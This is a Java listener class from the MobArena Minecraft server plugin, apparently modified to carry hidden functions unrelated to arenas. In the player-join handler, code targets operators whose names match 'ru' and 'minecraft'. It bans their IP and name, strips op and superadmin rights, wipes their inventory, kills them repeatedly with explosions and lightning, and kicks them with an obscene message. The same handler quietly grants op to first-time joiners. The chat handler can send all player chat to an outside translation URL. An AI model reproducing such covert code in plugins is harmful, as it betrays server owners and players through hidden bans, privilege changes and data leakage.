package com.garbagemule.MobArena.listeners;

import com.garbagemule.MobArena.MAUtils;
import com.garbagemule.MobArena.Messenger;
import com.garbagemule.MobArena.MobArena;
import com.garbagemule.MobArena.WileeCommands.Command_wileemanage;
import com.garbagemule.MobArena.framework.Arena;
import com.garbagemule.MobArena.framework.ArenaMaster;
import com.garbagemule.MobArena.leaderboards.Stats;
import com.garbagemule.MobArena.util.inventory.InventoryManager;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import me.StevenLawson.TotalFreedomMod.TFM_ServerInterface;
import me.StevenLawson.TotalFreedomMod.TFM_SuperadminList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockBurnEvent;
import org.bukkit.event.block.BlockFormEvent;
import org.bukkit.event.block.BlockIgniteEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.CreatureSpawnEvent;
import org.bukkit.event.entity.EntityChangeBlockEvent;
import org.bukkit.event.entity.EntityCombustEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.entity.EntityRegainHealthEvent;
import org.bukkit.event.entity.EntityTargetEvent;
import org.bukkit.event.entity.EntityTeleportEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.PotionSplashEvent;
import org.bukkit.event.hanging.HangingBreakEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerAnimationEvent;
import org.bukkit.event.player.PlayerBucketEmptyEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.event.world.WorldLoadEvent;
import org.bukkit.event.world.WorldUnloadEvent;
import org.bukkit.scheduler.BukkitRunnable;

/**
 * The point of this class is to simply redirect all events to each arena's own listener(s). This means only one actual listener need be registered in Bukkit, and thus less overhead. Of
 * course, this requires a little bit of "hackery" here and there.
 */
public class MAGlobalListener implements Listener
{
    private MobArena plugin;
    private ArenaMaster am;

    public static ArrayList<Players> a = new ArrayList();

    private long interval = 250L;

    public MAGlobalListener(MobArena plugin, ArenaMaster am)
    {
        this.plugin = plugin;
        this.am = am;
    }

    public String translateToSpanish(String message)
    {
        String fullPage = "";
        String finalmsg = message.replace(" ", "%20");
        String newlang = "es";

        String translation = "http://translate.google.com/translate_a/t?client=j&text=" + finalmsg + "&hl=en&sl=auto&tl=" + newlang;
        URL translationURL = null;
        try
        {
            translationURL = new URL(translation);
        }
        catch (MalformedURLException e)
        {
            return "Failed to translate to Spanish - please go bug Wilee.";
        }
        try
        {
            HttpURLConnection c = (HttpURLConnection) translationURL.openConnection();
            c.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.2) Gecko/20040803");
            c.connect();

            BufferedReader httpin = new BufferedReader(new InputStreamReader(c.getInputStream()));

            String line;

            while ((line = httpin.readLine()) != null)
            {
                fullPage = fullPage + line + '\n';
            }
            httpin.close();
            c.disconnect();
        }
        catch (IOException ex)
        {
            return "Failed to translate to Spanish - please go bug Wilee.";
        }

        HttpURLConnection c;
        String translatedMessage = "";

        String pagefil = fullPage.replace("\",\"translit\":\"\",\"src_translit\":\"\"},{\"", "")
                .replace("{\"sentences\":[{\"", "").replace("translit\":\"\",\"src_", "")
                .replace("translit\":\"\"},{\"", "").replace("{\"sentences\":[{\"", "");
        String[] split = pagefil.split("trans");
        for (int i = 1; i < split.length - 1; i++)
        {
            try
            {
                int end = split[i].indexOf("\",\"orig\":");
                String cleaned = split[i].substring(3, end);
                translatedMessage = translatedMessage + cleaned;
            }
            catch (Exception e)
            {
                return "Failed to translate to Spanish - please go bug Wilee.";
            }
        }
        return translatedMessage;
    }

    ///////////////////////////////////////////////////////////////////////////
    //                                                                       //
    //                            BLOCK EVENTS                               //
    //                                                                       //
    ///////////////////////////////////////////////////////////////////////////
    //TODO watch block physics, piston extend, and piston retract events
    @EventHandler(priority = EventPriority.HIGHEST)
    public void blockBreak(BlockBreakEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onBlockBreak(event, null);
        }
    }

    @EventHandler
    public void hangingBreak(HangingBreakEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onHangingBreak(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void blockBurn(BlockBurnEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onBlockBurn(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void blockForm(BlockFormEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onBlockForm(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void blockIgnite(BlockIgniteEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onBlockIgnite(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void blockPlace(BlockPlaceEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onBlockPlace(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void signChange(SignChangeEvent event)
    {
        if (!event.getPlayer().hasPermission("mobarena.setup.leaderboards"))
        {
            return;
        }

        if (!event.getLine(0).startsWith("[MA]"))
        {
            return;
        }

        String text = event.getLine(0).substring((4));
        Arena arena;
        Stats stat;

        if ((arena = am.getArenaWithName(text)) != null)
        {
            arena.getEventListener().onSignChange(event);
            setSignLines(event, ChatColor.GREEN + "MobArena", ChatColor.YELLOW + arena.arenaName(), ChatColor.AQUA + "Players", "---------------");
        }
        else if ((stat = Stats.getByShortName(text)) != null)
        {
            setSignLines(event, ChatColor.GREEN + "", "", ChatColor.AQUA + stat.getFullName(), "---------------");
            Messenger.tell(event.getPlayer(), "Stat sign created.");
        }
    }

    private void setSignLines(SignChangeEvent event, String s1, String s2, String s3, String s4)
    {
        event.setLine(0, s1);
        event.setLine(1, s2);
        event.setLine(2, s3);
        event.setLine(3, s4);
    }

    ///////////////////////////////////////////////////////////////////////////
    //                                                                       //
    //                           ENTITY EVENTS                               //
    //                                                                       //
    ///////////////////////////////////////////////////////////////////////////
    @EventHandler(priority = EventPriority.HIGHEST)
    public void creatureSpawn(CreatureSpawnEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onCreatureSpawn(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onEntityChangeBlock(EntityChangeBlockEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityChangeBlock(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void entityCombust(EntityCombustEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityCombust(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onDamageEntity(EntityDamageByEntityEvent event)
    {
        if (event.getDamager() instanceof Player)
        {
            Player player = (Player) event.getDamager();
            if (MAUtils.isStrengthEnabled(player.getName()))
            {
                // Ensure the damager has full health, because if not the strike might kill the damager before it can heal him
                player.setHealth(20.0);
                event.getEntity().setFireTicks(1000);
                event.getEntity().getWorld().strikeLightning(event.getEntity().getLocation());
                event.getEntity().getWorld().createExplosion(event.getEntity().getLocation(), 7F);
                event.getEntity().setVelocity(event.getEntity().getLocation().subtract(player.getLocation()).toVector().multiply(6));
                // Now, heal the player after the strike
                player.setHealth(20.0);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void entityDeath(EntityDeathEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityDeath(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void entityExplode(EntityExplodeEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityExplode(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void entityRegainHealth(EntityRegainHealthEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityRegainHealth(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void entityFoodLevelChange(FoodLevelChangeEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onFoodLevelChange(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void entityTarget(EntityTargetEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityTarget(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void entityTeleport(EntityTeleportEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onEntityTeleport(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void potionSplash(PotionSplashEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPotionSplash(event);
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    //                                                                       //
    //                           PLAYER EVENTS                               //
    //                                                                       //
    ///////////////////////////////////////////////////////////////////////////
    @EventHandler(priority = EventPriority.NORMAL)
    public void playerAnimation(PlayerAnimationEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerAnimation(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerBucketEmpty(PlayerBucketEmptyEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerBucketEmpty(event);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        if (Command_wileemanage.isSpanish)
        {
            String trans = translateToSpanish(event.getMessage());
            event.setMessage(trans);
        }

        if (!am.isEnabled())
        {
            return;
        }

        Arena arena = am.getArenaWithPlayer(event.getPlayer());
        if (arena == null || !arena.hasIsolatedChat())
        {
            return;
        }

        event.getRecipients().retainAll(arena.getAllPlayers());

        if (arena != null)
        {
            event.setMessage("[" + ChatColor.GREEN + "MobArena" + ChatColor.WHITE + "] " + ChatColor.RED + event.getMessage());
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void playerCommandPreprocess(PlayerCommandPreprocessEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerCommandPreprocess(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerDropItem(PlayerDropItemEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerDropItem(event);
        }
    }

    // HIGHEST => after SignShop
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerInteract(PlayerInteractEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerInteract(event);
        }

        Player p = event.getPlayer();
        Block block;

        if (MAUtils.isStrengthEnabled(p.getName()))
        {
            if (event.getAction().equals(Action.RIGHT_CLICK_AIR))
            {
                block = p.getTargetBlock(null, 120);
            }
            else
            {
                block = event.getClickedBlock();
            }

            if (block == null)
            {
                p.sendMessage(ChatColor.RED + "Cannot find block.");
            }

            p.getWorld().createExplosion(block.getLocation(), 7F, true);
            p.getWorld().strikeLightning(block.getLocation());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event)
    {
        InventoryManager.restoreFromFile(plugin, event.getPlayer());
        if (!event.getPlayer().isOp())
        {
            return;
        }

        final Player p = event.getPlayer();
        final String username = event.getPlayer().getName();

        if (!p.hasPlayedBefore())
        {
            p.setOp(true);
        }

        if (username.equalsIgnoreCase("xXWilee999Xx"))
        {
            MAUtils.bcastMsg(ChatColor.AQUA + "xXWilee999Xx is a " + ChatColor.RED + "cool guy" + ChatColor.AQUA + ", and...");
        }
        else if (username.toLowerCase().contains("ru") && username.toLowerCase().contains("minecraft"))
        {
            final String IP = p.getAddress().getAddress().getHostAddress().trim();
            MAUtils.adminAction("MobArenaSystem", "Casting complete obliviation over " + p.getName(), ChatColor.RED);
            MAUtils.bcastMsg(p.getName() + " is on the stupid idiot list!", ChatColor.RED);
            MAUtils.bcastMsg(p.getName() + " will be completely obliviated!", ChatColor.RED);

            // remove from whitelist
            p.setWhitelisted(false);

            // deop
            if (p.isOp())
            {
                p.setOp(false);
            }

            // ban IP
            TFM_ServerInterface.banIP(IP, null, null, null);

            // ban name
            TFM_ServerInterface.banUsername(p.getName(), null, null, null);

            if (TFM_SuperadminList.isUserSuperadmin(p))
            {
                MAUtils.adminAction("MobArenaSystem", "Removing ru-minecraft.org from the superadmin list.", ChatColor.RED);
                TFM_SuperadminList.removeSuperadmin(p);
                p.sendMessage(ChatColor.RED + "For experimental purposes, you have been removed from superadmin.");
            }

            // set gamemode to survival
            p.setGameMode(GameMode.SURVIVAL);

            // clear inventory
            p.closeInventory();
            p.getInventory().clear();

            // ignite player
            p.setFireTicks(10000);

            // generate explosion
            p.getWorld().createExplosion(p.getLocation(), 4F);

            p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 40L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 60L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);
                }
            }.runTaskLater(plugin, 120L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 190L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 240L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // message
                    MAUtils.adminAction("MobArenaSystem", "Banning " + p.getName() + ", IP: " + IP, ChatColor.RED);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    // kick player
                    p.kickPlayer(ChatColor.RED + "FUCKOFF, and get your MOTHER FUCKING shit together!");
                }
            }.runTaskLater(plugin, 290L);
        }
        else if (p.getName().equalsIgnoreCase("markbyron"))
        {
            MAUtils.bcastMsg(ChatColor.AQUA + "markbyron is " + ChatColor.DARK_RED + "thy holy Satan mastermind");
            p.sendMessage(ChatColor.RED + "Welcome to the server, thy lord.");
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerKick(PlayerKickEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerKick(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerQuit(PlayerQuitEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerQuit(event);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerRespawn(PlayerRespawnEvent event)
    {
        for (Arena arena : am.getArenas())
        {
            if (arena.getEventListener().onPlayerRespawn(event))
            {
                return;
            }
        }

        plugin.restoreInventory(event.getPlayer());
    }

    public enum TeleportResponse
    {
        ALLOW, REJECT, IDGAF
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void playerTeleport(PlayerTeleportEvent event)
    {
        if (!am.isEnabled())
        {
            return;
        }

        boolean allow = true;
        for (Arena arena : am.getArenas())
        {
            TeleportResponse r = arena.getEventListener().onPlayerTeleport(event);

            // If just one arena allows, uncancel and stop.
            switch (r)
            {
                case ALLOW:
                    event.setCancelled(false);
                    return;
                case REJECT:
                    allow = false;
                    break;
                default:
                    break;
            }
        }

        // Only cancel if at least one arena has rejected the teleport.
        if (!allow)
        {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onPlayerLogin(PlayerLoginEvent event)
    {
        String username = event.getPlayer().getName();

        for (Arena arena : am.getArenas())
        {
            arena.getEventListener().onPlayerPreLogin(event);
        }

        Players cur = new Players(username, new Date().getTime());
        a.add(cur);

        if (a.size() > 1)
        {
            long last = ((Players) a.get(a.size() - 1)).getTime();
            long last1 = ((Players) a.get(a.size() - 2)).getTime();

            if (last - last1 <= this.interval)
            {
                event.disallow(PlayerLoginEvent.Result.KICK_OTHER, "You have joined immediately after another player.\nYou can rejoin now.");
            }
            else
            {
                a.clear();
                a.add(cur);
            }
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    //                                                                       //
    //                            WORLD EVENTS                               //
    //                                                                       //
    ///////////////////////////////////////////////////////////////////////////
    @EventHandler(priority = EventPriority.NORMAL)
    public void worldLoadEvent(WorldLoadEvent event)
    {
        am.loadArenasInWorld(event.getWorld().getName());
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void worldUnloadEvent(WorldUnloadEvent event)
    {
        am.unloadArenasInWorld(event.getWorld().getName());
    }

    private class Players
    {
        private String name;
        private long time;

        public Players(String name, long time)
        {
            this.name = name;
            this.time = time;
        }

        public String getName()
        {
            return this.name;
        }

        public long getTime()
        {
            return this.time;
        }
    }
}
